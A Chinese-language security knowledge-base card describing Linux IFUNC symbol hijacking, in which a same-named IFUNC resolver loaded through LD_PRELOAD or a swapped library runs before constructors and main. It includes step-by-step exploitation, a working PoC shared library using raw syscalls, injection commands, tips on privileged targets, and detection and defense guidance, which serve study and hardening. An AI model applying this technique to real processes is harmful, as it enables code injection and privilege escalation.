---
id: code-analysis-reverse-linux-ifunc-symbol-hijack-resolver
title: IFUNC 重定向：同名 IFUNC 符号注入与加载期 resolver 执行
type: scenario
domain: code-analysis
path: code-analysis/reverse/linux
technique: ifunc-symbol-hijack
tags:
- linux
- elf
- ifunc
- dynamic-linker
- ld-preload
- resolver
- relocation
- bind-now
- static-link
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:54:20+08:00'
  notes: 已对照原文与图01-05/14核对：同名 IFUNC+LD_PRELOAD 在 BIND_NOW 下 resolver→ctor→main、fn(21)=63 落盘；lazy 下 ctor→main→resolver；stdio 版死锁 timeout 124；主程序自身 IFUNC 不可被 preload 覆盖。卡内“同名、同名”为笔误，不影响内容；未复跑
url: /docs/code-analysis/reverse/linux/code-analysis-reverse-linux-ifunc-symbol-hijack-resolver/
draft: false
kb_aliases:
- IFUNC 劫持
- STT_GNU_IFUNC
- resolver 注入
- 加载期代码执行
- LD_PRELOAD IFUNC
- IRELATIVE 重定位
- IFUNC 重定向
---

## 一句话结论

提供一个与目标依赖库同名、同名的 `STT_GNU_IFUNC` 符号（带自己的 resolver），`LD_PRELOAD` 让加载器在重定位时优先搜到它，加载器就会主动调用攻击者的 resolver——在构造函数和 `main` 之前执行代码，并把函数实现重定向到攻击者版本。

## 原理

- `STT_GNU_IFUNC` 符号的值不是最终函数地址，而是一个 resolver 入口。动态链接器在处理引用该符号的重定位时，**必须调用 resolver** 取得最终实现地址，再写入 GOT/调用点。
- 符号解析仍是“先到先得”：`LD_PRELOAD` 库排在依赖库之前，因此提供同名 IFUNC 的预加载库会抢在 `libfoo` 自己的 resolver 之前被选中。主程序自身定义的符号排在搜索列表首位，preload 压不过（边界）。
- resolver 的执行时机由**引用它的重定位类型和绑定模式**决定：
  - `R_X86_64_IRELATIVE`：主程序/库自己定义、自己引用的 IFUNC，链接器生成 IRELATIVE 重定位，**永远在加载期立即处理**；
  - `R_X86_64_JUMP_SLOT`：跨对象引用，走 PLT，默认 lazy（首次调用时才解析）；加 `-Wl,-z,now`（BIND_NOW）后回到加载期立即解析；
  - `dlopen(RTLD_LAZY)`：resolver 延迟到 `dlsym`/首次调用；`RTLD_NOW` 则在 dlopen 的重定位期执行；
  - 静态链接：没有动态链接器，IFUNC 由启动代码在更早阶段处理，仍在 `main` 之前。
- 与普通符号覆盖的区别：普通符号覆盖只是加载器往 GOT 写一个地址（让调用改道，属于“数据替换”）；IFUNC 覆盖会先**执行攻击者的 resolver**，再把返回值写入 GOT，多出一步“代码执行”。
- 早期执行点的代价：reloc 期 libc 的 stdio/动态内存设施尚未就绪。resolver 里调 `fprintf`/`fopen` 可能与 ld.so 重定位锁死锁（BIND_NOW 下进程挂起，timeout 124）；静态启动阶段调 `fprintf` 直接段错误（exit 139）。因此恶意 resolver 必须自包含，使用 raw syscall 或纯计算。
- 特权场景价值：resolver 早于 `main` 里的降权、seccomp、沙箱初始化，攻击者拿到的是“权限完整、防护未装”的执行窗口；若通过替换依赖库绕过 `AT_SECURE`，resolver 以进程最高权限执行。

## 触发条件

- 目标依赖某个导出 IFUNC 符号的共享库，或有静态链接的 IFUNC 引用；
- 攻击者能影响符号搜索顺序：设置 `LD_PRELOAD`/`LD_LIBRARY_PATH`（非 `AT_SECURE`）、替换依赖库文件、或控制 `RPATH/RUNPATH` 指向的目录；
- 目标符号被重定位引用（只有符号定义、无人引用时 resolver 不执行）；
- 若要“加载期执行”，目标需为 BIND_NOW/IRELATIVE，或攻击者能设置 `LD_BIND_NOW=1`；lazy 目标则推迟到首次调用；
- resolver 载荷必须使用 raw syscall 等自包含方式，不能依赖 libc stdio/malloc。

## 利用步骤

1. 枚举目标中的 IFUNC：`readelf -sW <bin|lib> | grep IFUNC`；确认哪个符号被引用（`readelf -rW` 查 `IRELATIVE`/`JUMP_SLOT`）。
2. 判断执行时机：`readelf -d <bin> | grep BIND_NOW`；无 BIND_NOW 且为跨对象引用时 resolver 在首次调用，BIND_NOW/IRELATIVE 则在加载期。
3. 编写恶意共享库：定义与目标依赖库同名的 IFUNC 符号，resolver 用 `syscall(SYS_write/SYS_openat/...)` 落盘或执行动作，返回攻击者实现（如 `x*3`）。
4. 编译：`gcc -O0 -fPIC -shared -o evil.so evil.c`；目标程序用 BIND_NOW 版本（`gcc ... -Wl,-z,now`）或设置 `LD_BIND_NOW=1`。
5. 注入：`LD_LIBRARY_PATH=. LD_PRELOAD=./evil.so ./prog_now`；观察 resolver 输出是否在 ctor/main 之前，函数结果是否被改写。
6. 用 `strace -f -e trace=write,openat,close ./prog_now` 验证 syscall 顺序：resolver 的 write/openat 排在最前，随后才是 ctor 与 main。
7. lazy 目标上重复，确认 resolver 推迟到首次调用；`dlopen(RTLD_LAZY)` 目标确认在 `dlsym` 时执行；静态目标用 `-static`/`-static-pie` 验证更早执行。
8. 特权目标：优先尝试替换 `DT_NEEDED` 依赖库（`AT_SECURE` 会忽略 LD_PRELOAD），并确认 resolver 早于目标自身的降权/seccomp 逻辑。

## PoC

```c
/* libfoo.c：受害者库，导出 IFUNC fn，正常实现 x*2 */
static int lib_fn_impl(int x) { return x * 2; }
static void *lib_fn_resolver(unsigned long hwcap) {
    fprintf(stderr, "[libfoo-resolver] hwcap=0x%lx\n", hwcap);
    return (void *)lib_fn_impl;
}
int fn(int x) __attribute__((ifunc("lib_fn_resolver")));

/* evil_sys.c：同名 IFUNC，resolver 用 raw syscall 落盘，实现改为 x*3 */
static int evil_sys_impl(int x) { return x * 3; }
static void *evil_sys_resolver(unsigned long hwcap) {
    static const char msg[] = "[evil-sys-resolver] raw syscall 在 ctor 与 main 之前执行\n";
    int fd;
    syscall(SYS_write, 2, msg, sizeof(msg) - 1);
    fd = syscall(SYS_openat, AT_FDCWD, "/tmp/ifunc_pwned_sys.txt",
                 O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        static const char body[] = "syscall resolver ran before ctor and main\n";
        syscall(SYS_write, fd, body, sizeof(body) - 1);
        syscall(SYS_close, fd);
    }
    return (void *)evil_sys_impl;
}
int fn(int x) __attribute__((ifunc("evil_sys_resolver")));
```

```bash
gcc -O0 -fPIC -shared -o libfoo.so libfoo.c
gcc -O0 -no-pie -o prog prog.c -L. -lfoo
gcc -O0 -no-pie -o prog_now prog.c -L. -lfoo -Wl,-z,now
gcc -O0 -fPIC -shared -o evil_sys.so evil_sys.c

readelf -sW libfoo.so | grep IFUNC
readelf -d prog_now | grep BIND_NOW

LD_LIBRARY_PATH=. LD_PRELOAD=./evil_sys.so ./prog_now
# 输出顺序：evil-sys-resolver → evil-ctor → main；fn(21)=63（原本 42）
cat /tmp/ifunc_pwned_sys.txt

# lazy 目标：resolver 推迟到首次调用，hwcap 为垃圾值
LD_LIBRARY_PATH=. LD_PRELOAD=./evil_sys.so ./prog
```

## 变体与关联

- IRELATIVE 自引用：resolver 无条件在加载期执行，即使目标 lazy 也一样。
- `dlopen(RTLD_LAZY)`：resolver 在 `dlsym` 时执行；`RTLD_NOW` 在 dlopen 时执行。
- 静态链接：`-static`/`-static-pie` 下 resolver 由启动代码在 main 前执行；静态二进制 IFUNC 数量更多（实测 38 个 vs 动态小程序 1 个），但 libc 更不可用。
- `LD_BIND_NOW=1`：不改二进制即可把 lazy 目标推到加载期解析。
- 边界：preload 覆盖不了主程序自身定义的 IFUNC；没有重定位引用时 resolver 不执行；glibc 版本化 IFUNC（如 `strlen@GLIBC_2.2.5`）用 `.symver` 劫持会因版本节点缺失编译失败。
- 关联卡片：[[binary-pwn-sandbox-escape-ifunc-resolver-before-constructor-seccomp]]（resolver 早于 constructor 安装 seccomp）、[[pentest-privilege-escalation-ld-preload-symbol-interposition-downgrade]]、[[defense-forensics-ifunc-resolver-triage]]、[[defense-hardening-ifunc-resolver-injection]]。

## 检测与防御

- 检测：`readelf -sW` 扫 IFUNC；`readelf -rW` 看 IRELATIVE/JUMP_SLOT；`readelf -d` 看 BIND_NOW；`LD_DEBUG=reloc` 看重定位处理；`strace -f -e trace=write,openat` 看启动期 syscall 是否早于 ctor/main；`ldd` 与 `/etc/ld.so.preload` 查注入来源。
- 防御：setuid/AT_SECURE 阻断 `LD_PRELOAD`/`LD_LIBRARY_PATH`；静态链接消除动态符号覆盖；库作者用版本脚本或 `-fvisibility=hidden` 隐藏 IFUNC 符号；审计构建产物 IFUNC 清单；把安全边界放在 ld.so 之前（静态 PIE + 自定义启动代码），让 resolver 阶段 syscall 暴露在第一道防线。
- 注意：以上都挡不住“root 拥有的库文件被替换”或 `RPATH/RUNPATH` 指向可写目录，那属于文件系统/供应链问题；resolver 的载荷必须自包含，stdio 在 reloc 期会死锁。
